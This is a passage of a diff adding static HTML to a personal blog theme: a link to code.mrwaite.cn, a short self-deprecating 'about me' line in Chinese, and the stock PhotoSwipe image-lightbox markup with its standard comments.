+            <li class="search-li">
+              <a href="http://code.mrwaite.cn/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>mrwaite</a>
+            </li>
+          
+        </ul>
+  		
+    	</section>
+    
+
+    
+    	<section class="tools-section tools-section-me" q-show="aboutme">
+  	  	
+  	  		<div class="aboutme-wrap" id="js-aboutme">一个辣鸡的web狗</div>
+  	  	
+    	</section>
+    
+  </div>
+  
+</div>
+    <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+  </div>
+</body>
+</html>
